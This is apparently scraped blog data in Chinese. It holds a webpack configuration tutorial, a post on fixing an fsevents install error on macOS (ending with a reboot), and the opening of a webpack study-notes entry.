Loader] 上面的例子中 test include exclude 这三个命中文件的配置项只传入了一个字符串或正则，其实它们还都支持数组类型，使用如下： 1234567891011121314&#123; test:[ /\\.jsx?$/, /\\.tsx?$/ ], include:[ path.resolve(__dirname, 'src'), path.resolve(__dirname, 'tests'), ], exclude:[ path.resolve(__dirname, 'node_modules'), path.resolve(__dirname, 'bower_modules'), ]&#125; 数组里的每项之间是或的关系，即文件路径符合数组中的任何一个条件就会被命中。 noParsenoParse 配置项可以让 Webpack 忽略对部分没采用模块化的文件的递归解析和处理，这样做的好处是能提高构建性能。 原因是一些库例如 jQuery 、ChartJS 它们庞大又没有采用模块化标准，让 Webpack 去解析这些文件耗时又没有意义。 noParse 是可选配置项，类型需要是 RegExp、[RegExp]、function 其中一个。 例如想要忽略掉 jQuery 、ChartJS，可以使用如下代码： 123456789// 使用正则表达式noParse: /jquery|chartjs/// 使用函数，从 Webpack 3.0.0 开始支持noParse: (content)=&gt; &#123; // content 代表一个模块的文件路径 // 返回 true or false return /jquery|chartjs/.test(content);&#125; 注意被忽略掉的文件里不应该包含 import 、 require 、 define 等模块化语句，不然会导致构建出的代码中包含无法在浏览器环境下执行的模块化语句。 parser因为 Webpack 是以模块化的 JavaScript 文件为入口，所以内置了对模块化 JavaScript 的解析功能，支持 AMD、CommonJS、SystemJS、ES6。 parser 属性可以更细粒度的配置哪些模块语法要解析哪些不解析，和 noParse 配置项的区别在于 parser 可以精确到语法层面， 而 noParse 只能控制哪些文件不被解析。 parser 使用如下： 12345678910111213141516171819module: &#123; rules: [ &#123; test: /\\.js$/, use: ['babel-loader'], parser: &#123; amd: false, // 禁用 AMD commonjs: false, // 禁用 CommonJS system: false, // 禁用 SystemJS harmony: false, // 禁用 ES6 import/export requireInclude: false, // 禁用 require.include requireEnsure: false, // 禁用 require.ensure requireContext: false, // 禁用 require.context browserify: false, // 禁用 browserify requireJs: false, // 禁用 requirejs &#125; &#125;, ]&#125; Resolve配置Webpack 在启动后会从配置的入口模块出发找出所有依赖的模块，Resolve 配置 Webpack 如何寻找模块所对应的文件。 Webpack 内置 JavaScript 模块化语法解析功能，默认会采用模块化标准里约定好的规则去寻找，但你也可以根据自己的需要修改默认的规则。 aliasresolve.alias 配置项通过别名来把原导入路径映射成一个新的导入路径。例如使用以下配置： 123456// Webpack alias 配置resolve:&#123; alias:&#123; components: './src/components/' &#125;&#125; 当你通过 import Button from ‘components/button’ 导入时，实际上被 alias 等价替换成了 import Button from ‘./src/components/button’。 以上 alias 配置的含义是把导入语句里的 components 关键字替换成 ./src/components/。 这样做可能会命中太多的导入语句，alias 还支持 $ 符号来缩小范围到只命中以关键字结尾的导入语句： 12345resolve:&#123; alias:&#123; 'react$': '/path/to/react.min.js' &#125;&#125; react$ 只会命中以 react 结尾的导入语句，即只会把import &#39;react&#39;关键字替换成 import &#39;/path/to/react.min.js&#39;。 mainFields有一些第三方模块会针对不同环境提供几分代码。 例如分别提供采用 ES5 和 ES6 的2份代码，这2份代码的位置写在 package.json 文件里，如下： 1234&#123; \"jsnext:main\": \"es/index.js\",// 采用 ES6 语法的代码入口文件 \"main\": \"lib/index.js\" // 采用 ES5 语法的代码入口文件&#125; Webpack 会根据 mainFields 的配置去决定优先采用那份代码，mainFields 默认如下： 1mainFields: ['browser', 'main'] Webpack 会按照数组里的顺序去package.json 文件里寻找，只会使用找到的第一个。 假如你想优先采用 ES6 的那份代码，可以这样配置： 1mainFields: ['jsnext:main', 'browser', 'main'] extensions在导入语句没带文件后缀时，Webpack 会自动带上后缀后去尝试访问文件是否存在。 resolve.extensions 用于配置在尝试过程中用到的后缀列表，默认是： 1extensions: ['.js', '.json'] 也就是说当遇到 require(‘./data’) 这样的导入语句时，Webpack 会先去寻找 ./data.js 文件，如果该文件不存在就去寻找 ./data.json 文件， 如果还是找不到就报错。 假如你想让 Webpack 优先使用目录下的 TypeScript 文件，可以这样配置： 1extensions: ['.ts', '.js', '.json'] modulesresolve.modules 配置 Webpack 去哪些目录下寻找第三方模块，默认是只会去 node_modules 目录下寻找。 有时你的项目里会有一些模块会大量被其它模块依赖和导入，由于其它模块的位置分布不定，针对不同的文件都要去计算被导入模块文件的相对路径， 这个路径有时候会很长，就像这样 import &#39;../../../components/button&#39;这时你可以利用 modules 配置项优化，假如那些被大量导入的模块都在./src/components目录下，把 modules 配置成 1modules:['./src/components','node_modules'] 后，你可以简单通过 import ‘button’ 导入，这样webpack就会依次到./src/components和node_modules寻找button这个模块。 resolve.modules是用来设置模块搜索的目录，设定目录以后，import模块路径，就可以从一个子目录开始写，这样就可以缩短模块引入路径。例如：resolve:{modules:[‘./src/components’]}则引入src下的components下的utils模块，就可以import’utils’这样就可以省略前面的src/components路径，作用是省略路径书写，让webpack自己查找而resolve.alias则是给路径设置别名，作用是用别名代替前面的路径，不是省略，而是用别名代替前面的长路径。这样其实有个好处，就是webpack直接会去别名对应的目录去查找模块，减少了webpack自己去按目录查找模块的时间。例如:resolve：{alias:{‘com’:’./src/components’}}引入utils模块，就可以这样写import’com/utils’也达到了缩短引入路径的目的，写法与resolve.modules略有不同。 descriptionFilesresolve.descriptionFiles 配置描述第三方模块的文件名称，也就是 package.json 文件。默认如下： 1descriptionFiles: ['package.json'] enforceExtensionresolve.enforceExtension 如果配置为 true 所有导入语句都必须要带文件后缀， 例如开启前 import ‘./foo’ 能正常工作，开启后就必须写成 import ‘./foo.js’。 enforceModuleExtensionenforceModuleExtension 和 enforceExtension 作用类似，但 enforceModuleExtension 只对 node_modules 下的模块生效。 enforceModuleExtension 通常搭配 enforceExtension 使用，在 enforceExtension:true 时，因为安装的第三方模块中大多数导入语句没带文件后缀， 所以这时通过配置 enforceModuleExtension:false 来兼容第三方模块。 pluginPlugin 用于扩展 Webpack 功能，各种各样的 Plugin 几乎让 Webpack 可以做任何构建相关的事情。 配置 PluginPlugin 的配置很简单，plugins 配置项接受一个数组，数组里每一项都是一个要使用的 Plugin 的实例，Plugin 需要的参数通过构造函数传入。 1234567891011const CommonsChunkPlugin = require('webpack/lib/optimize/CommonsChunkPlugin');module.exports = &#123; plugins: [ // 所有页面都会用到的公共代码提取到 common 代码块中 new CommonsChunkPlugin(&#123; name: 'common', chunks: ['a', 'b'] &#125;), ]&#125;; 使用 Plugin 的难点在于掌握 Plugin 本身提供的配置项，而不是如何在 Webpack 中接入 Plugin。 几乎所有 Webpack 无法直接实现的功能都能在社区找到开源的 Plugin 去解决，你需要善于使用搜索引擎去寻找解决问题的方法。 devServer前面我们使用DevServer 介绍过用来提高开发效率的 DevServer ，它提供了一些配置项可以改变 DevServer 的默认行为。 要配置 DevServer ，除了在配置文件里通过 devServer 传入参数外，还可以通过命令行参数传入。 注意只有在通过 DevServer 去启动 Webpack 时配置文件里 devServer 才会生效，因为这些参数所对应的功能都是 DevServer 提供的，Webpack 本身并不认识 devServer 配置项。 hotdevServer.hot 配置是否启用DevServer 中提到的模块热替换功能。 DevServer 默认的行为是在发现源代码被更新后会通过自动刷新整个页面来做到实时预览，开启模块热替换功能后将在不刷新整个页面的情况下通过用新模块替换老模块来做到实时预览。 inlineDevServer 的实时预览功能依赖一个注入到页面里的代理客户端去接受来自 DevServer 的命令和负责刷新网页的工作。 devServer.inline 用于配置是否自动注入这个代理客户端到将运行在页面里的 Chunk 里去，默认是会自动注入。 DevServer 会根据你是否开启 inline 来调整它的自动刷新策略： 如果开启 inline，DevServer 会在构建完变化后的代码时通过代理客户端控制网页刷新。 如果关闭 inline，DevServer 将无法直接控制要开发的网页。这时它会通过 iframe 的方式去运行要开发的网页，当构建完变化后的代码时通过刷新 iframe 来实现实时预览。 但这时你需要去 http://localhost:8080/webpack-dev-server/ 实时预览你的网页了。 如果你想使用 DevServer 去自动刷新网页实现实时预览，最方便的方法是直接开启 inline。 historyApiFallbackdevServer.historyApiFallback 用于方便的开发使用了 HTML5 History API 的单页应用。 这类单页应用要求服务器在针对任何命中的路由时都返回一个对应的 HTML 文件，例如在访问 http://localhost/user 和 http://localhost/home 时都返回 index.html 文件， 浏览器端的 JavaScript 代码会从 URL 里解析出当前页面的状态，显示出对应的界面。 配置 historyApiFallback 最简单的做法是： 1historyApiFallback: true 这会导致任何请求都会返回 index.html 文件，这只能用于只有一个 HTML 文件的应用。 如果你的应用由多个单页应用组成，这就需要 DevServer 根据不同的请求来返回不同的 HTML 文件，配置如下： 12345678910historyApiFallback: &#123; // 使用正则匹配命中路由 rewrites: [ // /user 开头的都返回 user.html &#123; from: /^\\/user/, to: '/user.html' &#125;, &#123; from: /^\\/game/, to: '/game.html' &#125;, // 其它的都返回 index.html &#123; from: /./, to: '/index.html' &#125;, ]&#125; contentBasedevServer.contentBase 配置 DevServer HTTP 服务器的文件根目录。 默认情况下为当前执行目录，通常是项目根目录，所有一般情况下你不必设置它，除非你有额外的文件需要被 DevServer 服务。 例如你想把项目根目录下的 public 目录设置成 DevServer 服务器的文件根目录，你可以这样配置： 123devServer:&#123; contentBase: path.join(__dirname, 'public')&#125; 这里需要指出可能会让你疑惑的地方，DevServer 服务器通过 HTTP 服务暴露出的文件分为两类： 暴露本地文件。 暴露 Webpack 构建出的结果，由于构建出的结果交给了 DevServer，所以你在使用了 DevServer 时在本地找不到构建出的文件。 contentBase 只能用来配置暴露本地文件的规则，你可以通过 contentBase:false 来关闭暴露本地文件。 headersdevServer.headers 配置项可以在 HTTP 响应中注入一些 HTTP 响应头，使用如下： 12345devServer:&#123; headers: &#123; 'X-foo':'bar' &#125;&#125; hostdevServer.host 配置项用于配置 DevServer 服务监听的地址。 例如你想要局域网中的其它设备访问你本地的服务，可以在启动 DevServer 时带上 –host 0.0.0.0。 host 的默认值是 127.0.0.1 即只有本地可以访问 DevServer 的 HTTP 服务。 portdevServer.port 配置项用于配置 DevServer 服务监听的端口，默认使用 8080 端口。 如果 8080 端口已经被其它程序占有就使用 8081，如果 8081 还是被占用就使用 8082，以此类推。 allowedHostsdevServer.allowedHosts 配置一个白名单列表，只有 HTTP 请求的 HOST 在列表里才正常返回，使用如下： allowedHosts: [ // 匹配单个域名 ‘host.com’, ‘sub.host.com’, // host2.com 和所有的子域名 *.host2.com 都将匹配 ‘.host2.com’] disableHostCheckdevServer.disableHostCheck 配置项用于配置是否关闭用于 DNS 重绑定的 HTTP 请求的 HOST 检查。 DevServer 默认只接受来自本地的请求，关闭后可以接受来自任何 HOST 的请求。 它通常用于搭配 –host 0.0.0.0 使用，因为你想要其它设备访问你本地的服务，但访问时是直接通过 IP 地址访问而不是 HOST 访问，所以需要关闭 HOST 检查。 httpsDevServer 默认使用 HTTP 协议服务，它也能通过 HTTPS 协议服务。 有些情况下你必须使用 HTTPS，例如 HTTP2 和 Service Worker 就必须运行在 HTTPS 之上。 要切换成 HTTPS 服务，最简单的方式是： 123devServer:&#123; https: true&#125; DevServer 会自动的为你生成一份 HTTPS 证书。 如果你想用自己的证书可以这样配置： 1234567devServer:&#123; https: &#123; key: fs.readFileSync('path/to/server.key'), cert: fs.readFileSync('path/to/server.crt'), ca: fs.readFileSync('path/to/ca.pem') &#125;&#125; clientLogLeveldevServer.clientLogLevel 配置在客户端的日志等级，这会影响到你在浏览器开发者工具控制台里看到的日志内容。 clientLogLevel 是枚举类型，可取如下之一的值 none | error | warning | info。 默认为 info 级别，即输出所有类型的日志，设置成 none 可以不输出任何日志。 compressdevServer.compress 配置是否启用 gzip 压缩。boolean 为类型，默认为 false。 opendevServer.open 用于在 DevServer 启动且第一次构建完时自动用你系统上默认的浏览器去打开要开发的网页。 同时还提供 devServer.openPage 配置项用于打开指定 URL 的网页。 其他配置项TargetJavaScript 的应用场景越来越多，从浏览器到 Node.js，这些运行在不同环境的 JavaScript 代码存在一些差异。 target 配置项可以让 Webpack 构建出针对不同运行环境的代码。 target 可以是以下之一：例如当你设置 target:’node’ 时，源代码中导入 Node.js 原生模块的语句 require(‘fs’) 将会被保留，fs 模块的内容不会打包进 Chunk 里。 DevTool代码生成 Source Map 以方便调试，可以这样配置： 123module.export = &#123; devtool: 'source-map'&#125; Watch 和 WatchOptions前面介绍过 Webpack 的监听模式，它支持监听文件更新，在文件发生变化时重新编译。在使用 Webpack 时监听模式默认是关闭的，想打开需要如下配置： 123module.export = &#123; watch: true&#125; 在使用 DevServer 时，监听模式默认是开启的。 除此之外，Webpack 还提供了 watchOptions 配置项去更灵活的控制监听模式，使用如下： 123456789101112131415161718module.export = &#123; // 只有在开启监听模式时，watchOptions 才有意义 // 默认为 false，也就是不开启 watch: true, // 监听模式运行时的参数 // 在开启监听模式时，才有意义 watchOptions: &#123; // 不监听的文件或文件夹，支持正则匹配 // 默认为空 ignored: /node_modules/, // 监听到变化发生后会等300ms再去执行动作，防止文件更新太快导致重新编译频率太高 // 默认为 300ms aggregateTimeout: 300, // 判断文件是否发生变化是通过不停的去询问系统指定文件有没有变化实现的 // 默认每隔1000毫秒询问一次 poll: 1000 &#125;&#125; 上述代码中需要注意的点： 监听到变化发生后默认会等300ms再去执行动作，防止文件更新太快导致重新编译频率太高 判断文件是否发生变化是通过不停的去询问系统指定文件有没有变化实现的，默认1000ms询问一次 ExternalsExternals 用来告诉 Webpack 要构建的代码中使用了哪些不用被打包的模块，也就是说这些模版是外部环境提供的，Webpack 在打包时可以忽略它们。 有些 JavaScript 运行环境可能内置了一些全局变量或者模块，例如在你的 HTML HEAD 标签里通过以下代码： 1&lt;script src=\"path/to/jquery.js\"&gt;&lt;/script&gt; 引入 jQuery 后，全局变量 jQuery 就会被注入到网页的 JavaScript 运行环境里。 如果想在使用模块化的源代码里导入和使用 jQuery，可能需要这样： 12import $ from 'jquery';$('.my-element'); 构建后你会发现输出的 Chunk 里包含的 jQuery 库的内容，这导致 jQuery 库出现了2次，浪费加载流量，最好是 Chunk 里不会包含 jQuery 库的内容。 Externals 配置项就是为了解决这个问题。 通过 externals 可以告诉 Webpack JavaScript 运行环境已经内置了那些全局变量，针对这些全局变量不用打包进代码中而是直接使用全局变量。 要解决以上问题，可以这样配置 externals： 123456module.export = &#123; externals: &#123; // 把导入语句里的 jquery 替换成运行环境里的全局变量 jQuery jquery: 'jQuery' &#125;&#125; ResolveLoaderResolveLoader 用来告诉 Webpack 如何去寻找 Loader，因为在使用 Loader 时是通过其包名称去引用的， Webpack 需要根据配置的 Loader 包名去找到 Loader 的实际代码，以调用 Loader 去处理源文件。 ResolveLoader 的默认配置如下： 12345678910module.exports = &#123; resolveLoader:&#123; // 去哪个目录下寻找 Loader modules: ['node_modules'], // 入口文件的后缀 extensions: ['.js', '.json'], // 指明入口文件位置的字段 mainFields: ['loader', 'main'] &#125;&#125; 该配置项常用于加载本地的 Loader。 一份整体的配置结构123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178const path = require('path');module.exports = &#123; // entry 表示 入口，Webpack 执行构建的第一步将从 Entry 开始，可抽象成输入。 // 类型可以是 string | object | array entry: './app/entry', // 只有1个入口，入口只有1个文件 entry: ['./app/entry1', './app/entry2'], // 只有1个入口，入口有2个文件 entry: &#123; // 有2个入口 a: './app/entry-a', b: ['./app/entry-b1', './app/entry-b2'] &#125;, // 如何输出结果：在 Webpack 经过一系列处理后，如何输出最终想要的代码。 output: &#123; // 输出文件存放的目录，必须是 string 类型的绝对路径。 path: path.resolve(__dirname, 'dist'), // 输出文件的名称 filename: 'bundle.js', // 完整的名称 filename: '[name].js', // 当配置了多个 entry 时，通过名称模版为不同的 entry 生成不同的文件名称 filename: '[chunkhash].js', // 根据文件内容 hash 值生成文件名称，用于浏览器长时间缓存文件 // 发布到线上的所有资源的 URL 前缀，string 类型 publicPath: '/images/assets/', // 放到指定目录下 publicPath: '', // 放到根目录下 publicPath: 'https://cdn.example.com/', // 放到 CDN 上去 // 导出库的名称，string 类型 // 不填它时，默认输出格式是匿名的立即执行函数 library: 'MyLibrary', // 导出库的类型，枚举类型，默认是 var // 可以是 umd | umd2 | commonjs2 | commonjs | amd | this | var | assign | window | global | jsonp ， libraryTarget: 'umd', // 是否包含有用的文件路径信息到生成的代码里去，boolean 类型 pathinfo: true, // 附加 Chunk 的文件名称 chunkFilename: '[id].js', chunkFilename: '[chunkhash].js', // JSONP 异步加载资源时的回调函数名称，需要和服务端搭配使用 jsonpFunction: 'myWebpackJsonp', // 生成的 Source Map 文件名称 sourceMapFilename: '[file].map', // 浏览器开发者工具里显示的源码模块名称 devtoolModuleFilenameTemplate: 'webpack:///[resource-path]', // 异步加载跨域的资源时使用的方式 crossOriginLoading: 'use-credentials', crossOriginLoading: 'anonymous', crossOriginLoading: false, &#125;, // 配置模块相关 module: &#123; rules: [ // 配置 Loader &#123; test: /\\.jsx?$/, // 正则匹配命中要使用 Loader 的文件 include: [ // 只会命中这里面的文件 path.resolve(__dirname, 'app') ], exclude: [ // 忽略这里面的文件 path.resolve(__dirname, 'app/demo-files') ], use: [ // 使用那些 Loader，有先后次序，从后往前执行 'style-loader', // 直接使用 Loader 的名称 &#123; loader: 'css-loader', options: &#123; // 给 html-loader 传一些参数 &#125; &#125; ] &#125;, ], noParse: [ // 不用解析和处理的模块 /special-library\\.js$/ // 用正则匹配 ], &#125;, // 配置插件 plugins: [ ], // 配置寻找模块的规则 resolve: &#123; modules: [ // 寻找模块的根目录，array 类型，默认以 node_modules 为根目录 'node_modules', path.resolve(__dirname, 'app') ], extensions: ['.js', '.json', '.jsx', '.css'], // 模块的后缀名 alias: &#123; // 模块别名配置，用于映射模块 // 把 'module' 映射 'new-module'，同样的 'module/path/file' 也会被映射成 'new-module/path/file' 'module': 'new-module', // 使用结尾符号 $ 后，把 'only-module' 映射成 'new-module'， // 但是不像上面的，'module/path/file' 不会被映射成 'new-module/path/file' 'only-module$': 'new-module', &#125;, alias: [ // alias 还支持使用数组来更详细的配置 &#123; name: 'module', // 老的模块 alias: 'new-module', // 新的模块 // 是否是只映射模块，如果是 true 只有 'module' 会被映射，如果是 false 'module/inner/path' 也会被映射 onlyModule: true, &#125; ], symlinks: true, // 是否跟随文件软链接去搜寻模块的路径 descriptionFiles: ['package.json'], // 模块的描述文件 mainFields: ['main'], // 模块的描述文件里的描述入口的文件的字段名称 enforceExtension: false, // 是否强制导入语句必须要写明文件后缀 &#125;, // 输出文件性能检查配置 performance: &#123; hints: 'warning', // 有性能问题时输出警告 hints: 'error', // 有性能问题时输出错误 hints: false, // 关闭性能检查 maxAssetSize: 200000, // 最大文件大小 (单位 bytes) maxEntrypointSize: 400000, // 最大入口文件大小 (单位 bytes) assetFilter: function(assetFilename) &#123; // 过滤要检查的文件 return assetFilename.endsWith('.css') || assetFilename.endsWith('.js'); &#125; &#125;, devtool: 'source-map', // 配置 source-map 类型 context: __dirname, // Webpack 使用的根目录，string 类型必须是绝对路径 // 配置输出代码的运行环境 target: 'web', // 浏览器，默认 target: 'webworker', // WebWorker target: 'node', // Node.js，使用 `require` 语句加载 Chunk 代码 target: 'async-node', // Node.js，异步加载 Chunk 代码 target: 'node-webkit', // nw.js target: 'electron-main', // electron, 主线程 target: 'electron-renderer', // electron, 渲染线程 externals: &#123; // 使用来自 JavaScript 运行环境提供的全局变量 jquery: 'jQuery' &#125;, stats: &#123; // 控制台输出日志控制 assets: true, colors: true, errors: true, errorDetails: true, hash: true, &#125;, devServer: &#123; // DevServer 相关的配置 proxy: &#123; // 代理到后端服务接口 '/api': 'http://localhost:3000' &#125;, contentBase: path.join(__dirname, 'public'), // 配置 DevServer HTTP 服务器的文件根目录 compress: true, // 是否开启 gzip 压缩 historyApiFallback: true, // 是否开发 HTML5 History API 网页 hot: true, // 是否开启模块热替换功能 https: false, // 是否开启 HTTPS 模式 &#125;, profile: true, // 是否捕捉 Webpack 构建的性能信息，用于分析什么原因导致构建性能不佳 cache: false, // 是否启用缓存提升构建速度 watch: true, // 是否开始 watchOptions: &#123; // 监听模式选项 // 不监听的文件或文件夹，支持正则匹配。默认为空 ignored: /node_modules/, // 监听到变化发生后会等300ms再去执行动作，防止文件更新太快导致重新编译频率太高 // 默认为300ms aggregateTimeout: 300, // 判断文件是否发生变化是不停的去询问系统指定文件有没有变化，默认每隔1000毫秒询问一次 poll: 1000 &#125;,&#125; 多种配置类型除了通过导出一个 Object 来描述 Webpack 所需的配置外，还有其它更灵活的方式，以简化不同场景的配置。 下面来一一介绍它们。 导出一个 Function在大多数时候你需要从同一份源代码中构建出多份代码，例如一份用于开发时，一份用于发布到线上。 如果采用导出一个 Object 来描述 Webpack 所需的配置的方法，需要写两个文件。 一个用于开发环境，一个用于线上环境。再在启动时通过 webpack –config webpack.config.js 指定使用哪个配置文件。 采用导出一个 Function 的方式，能通过 JavaScript 灵活的控制配置，做到只用写一个配置文件就能完成以上要求。 导出一个 Function 的使用方式如下： 12345678910111213141516171819202122const path = require('path');const UglifyJsPlugin = require('webpack/lib/optimize/UglifyJsPlugin');module.exports = function (env = &#123;&#125;, argv) &#123; const plugins = []; const isProduction = env['production']; // 在生成环境才压缩 if (isProduction) &#123; plugins.push( // 压缩输出的 JS 代码 new UglifyJsPlugin() ) &#125; return &#123; plugins: plugins, // 在生成环境不输出 Source Map devtool: isProduction ? undefined : 'source-map', &#125;;&#125; 在运行 Webpack 时，会给这个函数传入2个参数，分别是： env：当前运行时的 Webpack 专属环境变量，env 是一个 Object。读取时直接访问 Object 的属性，设置它需要在启动 Webpack 时带上参数。例如启动命令是 webpack –env.production –env.bao=foo时，则 env 的值是 {“production”:”true”,”bao”:”foo”}。 argv：代表在启动 Webpack 时所有通过命令行传入的参数，例如 –config、–env、–devtool，可以通过 webpack -h 列出所有 Webpack 支持的命令行参数。 就以上配置文件而言，在开发时执行命令 webpack 构建出方便调试的代码，在需要构建出发布到线上的代码时执行 webpack –env.production 构建出压缩的代码。 本实例 提供项目完整代码 导出一个返回 Promise 的函数在有些情况下你不能以同步的方式返回一个描述配置的 Object，Webpack 还支持导出一个返回 Promise 的函数，使用如下： 123456789module.exports = function(env = &#123;&#125;, argv) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#123; // ... &#125;) &#125;, 5000) &#125;)&#125; 导出多份配置除了只导出一份配置外，Webpack 还支持导出一个数组，数组中可以包含每份配置，并且每份配置都会执行一遍构建。 注意本特性从 Webpack 3.1.0 版本才开始支持。 使用如下： 12345678910111213141516module.exports = [ // 采用 Object 描述的一份配置 &#123; // ... &#125;, // 采用函数描述的一份配置 function() &#123; return &#123; // ... &#125; &#125;, // 采用异步函数描述的一份配置 function() &#123; return Promise(); &#125;] 以上配置会导致 Webpack 针对这三份配置执行三次不同的构建。 这特别适合于用 Webpack 构建一个要上传到 Npm 仓库的库，因为库中可能需要包含多种模块化格式的代码，例如 CommonJS、UMD。 配置总结从前面的配置看来选项很多，Webpack 内置了很多功能。 你不必都记住它们，只需要大概明白 Webpack 原理和核心概念去判断选项大致属于哪个大模块下，再去查详细的使用文档。 通常你可用如下经验去判断如何配置 Webpack： 想让源文件加入到构建流程中去被 Webpack 控制，配置 entry。 想自定义输出文件的位置和名称，配置 output。 想自定义寻找依赖模块时的策略，配置 resolve。 想自定义解析和转换文件的策略，配置 module，通常是配置 module.rules 里的 Loader。 其它的大部分需求可能要通过 Plugin 去实现，配置 plugin。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"webpack","slug":"技术/前端/webpack","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/webpack/"}],"tags":[]},{"title":"mac安装webpack时fsevents依赖安装报错","slug":"mac安装webpack时fsevents依赖安装报错","date":"2020-07-27T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/07/28/mac安装webpack时fsevents依赖安装报错/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/28/mac%E5%AE%89%E8%A3%85webpack%E6%97%B6fsevents%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99/","excerpt":"安装webpack时fsevents依赖安装报错mac安装webpack时，会同时安装fsevents，但是在安装时候发生了报错 由于后来解决了，所以没有当时的报错截图，但是和下面这个大概一致","text":"安装webpack时fsevents依赖安装报错mac安装webpack时，会同时安装fsevents，但是在安装时候发生了报错 由于后来解决了，所以没有当时的报错截图，但是和下面这个大概一致 12345678910111213141516171819202122232425262728293031323334clang: warning: using sysroot for 'iPhoneSimulator' but targeting 'MacOSX' [-Wincompatible-sysroot]In file included from ../fsevents.cc:72:../src/thread.cc:36:25: error: unknown type name 'ConstFSEventStreamRef'void HandleStreamEvents(ConstFSEventStreamRef stream, void *ctx, size_t ... ^../src/thread.cc:36:108: error: unknown type name 'FSEventStreamEventFlags' ...stream, void *ctx, size_t numEvents, void *eventPaths, const FSEventStre... ^../src/thread.cc:36:152: error: unknown type name 'FSEventStreamEventId' ...*eventPaths, const FSEventStreamEventFlags eventFlags[], const FSEventSt... ^../src/thread.cc:54:3: error: unknown type name 'FSEventStreamContext' FSEventStreamContext context = &#123; 0, ctx, NULL, NULL, NULL &#125;; ^../src/thread.cc:56:3: error: unknown type name 'FSEventStreamRef' FSEventStreamRef stream = FSEventStreamCreate(NULL, &amp;HandleStreamEvent... ^../src/thread.cc:56:98: error: use of undeclared identifier 'kFSEventStreamEventIdSinceNow' ...&amp;HandleStreamEvents, &amp;context, fse-&gt;paths, kFSEventStreamEventIdSinceNow... ^6 errors generated.make: *** [Release/obj.target/fse/fsevents.o] Error 1gyp ERR! build error gyp ERR! stack Error: `make` failed with exit code: 2gyp ERR! stack at ChildProcess.onExit (/usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/build.js:194:23)gyp ERR! stack at ChildProcess.emit (events.js:210:5)gyp ERR! stack at Process.ChildProcess._handle.onexit (internal/child_process.js:272:12)gyp ERR! System Darwin 19.2.0gyp ERR! command \"/usr/local/bin/node\" \"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\" \"rebuild\"gyp ERR! cwd /Users/macos/Desktop/baps_yuva/node_modules/fseventsgyp ERR! node -v v12.14.0gyp ERR! node-gyp -v v5.0.5gyp ERR! not ok 原文给的解决方案是安装npm的最新版本，然而我试了过后依然是一样的问题。 过程中先是遇到了xcode路径识别错误的问题。。。心想我就装个webpack，这怎么又和xcode扯上关系了。不过想一想node的编译需要基于c++和python的编译器，这需要xcode来提供，而且苹果命令行工具也和xcode有关系（至于什么关系，本mac白痴不知道，以后慢慢研究吧）。想到这些我逐渐陷入了沉思。。。 一开始下载的xcode放到了download目录，后来我把他挪到了Applications目录下，结果安装webpack就报错，因为命令行工具依然去download目录下寻找xcode，后来各种什么改xcode-select的路径试了个遍，这篇博客讲的就不错：xcode-select切换路径无效。 照做之后先前报的错也解决了。但是出现了一个新错误：具体是啥我忘了，但大体的意思依然说“在download目录下没有找到xcode文件夹下的模块”之类的balabala。 我当时执行xcode-select -p ，看到的路径已经正确了，为什么还要去download目录下找？？？爷又没在download里面放小姐姐，这个目录就这么吸引你这个破命令行吗？？ 于是我直接拷贝了一份xcode去download目录，你不是找不到吗，爷复制一份给你还不行吗！！！然后就报了上面的错 于是我索性重装了xcode和命令行工具，在终于没有报路径的错误之后我正高兴：就给我来了上面文章开头这一出。。。。 后来在一个github的众多issure的一个角落里发现了终极解决方案：。。。。。。。。。。。。。。。。。。。。。。。。。重启电脑 将信将疑，一试……. nb！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"webpack","slug":"技术/前端/webpack","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/webpack/"}],"tags":[]},{"title":"深入浅出-Webpack学习笔记（一）","slug":"深入浅出-Webpack学习笔记（一）","date":"2020-07-27T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/07/28/深入浅出-Webpack学习笔记（一）/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/28/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-Webpack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"webpack的思想Webpack 是一个打包模块化 JavaScript 的工具，在 Webpack 里一切文件皆模块，通过 Loader 转换文件，通过 Plugin 注入钩子，最后输出由多个模块组合成的文件。Webpack 专注于构建模块化项目。 其官网的首页图很形象的画出了 Webpack 是什么 一切文件：JavaScript、CSS、SCSS、图片、模板，在 Webpack 眼中都是一个个模块，这样的好处是能清晰的描述出各个模块之间的依赖关系，以方便 Webpack 对模块进行组合和打包。 经过 Webpack 的处理，最终会输出浏览器能使用的静态资源。 Webpack的优点是： 专注于处理模块化的项目，能做到开箱即用一步到位； 通过 Plugin 扩展，完整好用又不失灵活； 使用场景不仅限于 Web 开发； 社区庞大活跃，经常引入紧跟时代发展的新特性，能为大多数场景找到已有的开源扩展；良好的开发体验。","text":"webpack的思想Webpack 是一个打包模块化 JavaScript 的工具，在 Webpack 里一切文件皆模块，通过 Loader 转换文件，通过 Plugin 注入钩子，最后输出由多个模块组合成的文件。Webpack 专注于构建模块化项目。 其官网的首页图很形象的画出了 Webpack 是什么 